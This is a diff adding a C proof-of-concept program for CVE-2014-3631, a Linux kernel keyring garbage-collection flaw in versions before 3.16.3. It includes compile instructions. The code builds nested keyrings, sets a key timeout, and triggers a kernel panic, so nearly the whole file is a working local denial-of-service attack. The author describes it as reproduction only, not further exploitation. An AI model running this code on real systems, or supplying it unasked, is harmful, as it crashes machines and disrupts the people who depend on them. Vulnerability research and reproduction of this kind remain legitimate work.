@@ -1,0 +1,107 @@
+/* ----------------------------------------------------------------------------------------------------
+ * cve-2014-3631_poc.c
+ * 
+ * The assoc_array_gc function in the associative-array implementation in lib/assoc_array.c in the Linux kernel before 3.16.3 
+ * does not properly implement garbage collection, which allows local users to cause a denial of service (NULL pointer dereference and system crash) 
+ * or possibly have unspecified other impact via multiple "keyctl newring" operations followed by a "keyctl timeout" operation. 
+ *
+ * 
+ * This is a POC to reproduce vulnerability. No exploitation here, just simple kernel panic.
+ * 
+ * Compile with gcc -fno-stack-protector -Wall -o cve-2014-3631_poc cve-2014-3631_poc.c  -lkeyutils 
+ * 
+ * 
+ * Emeric Nasi - www.sevagas.com
+ *-----------------------------------------------------------------------------------------------------*/
+
+
+/* -----------------------   Includes ----------------------------*/
+
+#define _GNU_SOURCE 1
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <syscall.h>
+#include <stdint.h>
+#include <inttypes.h>
+#include <keyutils.h>
+#include <fcntl.h>
+
+
+#define TARGET_KERNEL_MIN "3.13.0"
+#define TARGET_KERNEL_MAX "3.16.2"
+#define EXPLOIT_NAME "cve-2014-3631"
+#define EXPLOIT_TYPE DOS
+
+
+/* -----------------------   functions ----------------------------*/
+
+
+
+/**
+ * Poc for cve_2014_3631 vulnerability
+ */
+int main()
+{
+  key_serial_t currentKey = 0;
+  key_serial_t topKey = 0;
+  int i = 0;
+  int fp;
+  char kname[16]={0};
+  char gc_delay[16] = {0};
+  int delay  =0;
+  
+  printf("[cve_2014_3631]: Preparing to exploit.\n");
+
+  // fetch garbage collector value..
+  fp = open("/proc/sys/kernel/keys/gc_delay",O_RDONLY);
+  if(fp == -1)
+  {
+     printf("[cve_2014_3631 error]: Could not open /proc/sys/kernel/keys/gc_delay, assuming delay is 5 minutes. \n");
+     delay = 300;
+  }
+  else
+  {
+    read(fp,gc_delay,sizeof(gc_delay-1));
+    delay = atoi(gc_delay);
+    close(fp);  
+  }
+
+  // Add top key
+  topKey = add_key("keyring","Lvl1K",NULL,0,KEY_SPEC_USER_KEYRING);
+  if(topKey == -1)
+  {
+    printf("[cve_2014_3631 error]: keyring  fault\n");
+    perror("add_key");
+    return -1;
+  }
+  
+  // Add 18 keys to top key
+  for(i=0; i< 18; i++)
+  {
+    memset(kname,00,sizeof(kname));
+    memcpy(kname,"Lvl2K_",strlen("Lvl2K_"));
+    sprintf(kname+strlen("Lvl2K_"),"%d",i);
+    currentKey = add_key("keyring",kname,NULL,0,topKey);
+    if(currentKey == -1)
+    {
+      printf("[cve_2014_3631 error]: keyring  fault\n");
+      perror("add_key");
+      return -1;
+    }
+  } 
+  
+  /* Entering exploit critical code */
+  printf("[cve_2014_3631]:  Exploit!\n");
+  
+  // Set timeout and wait for garbage collector
+  keyctl_set_timeout(currentKey, 2);
+  
+  // Wait for garbage collector
+  printf("[cve_2014_3631]: Exploit triggered, system will panic in  %d seconds..\n",delay);
+  
+  return 0;
+}
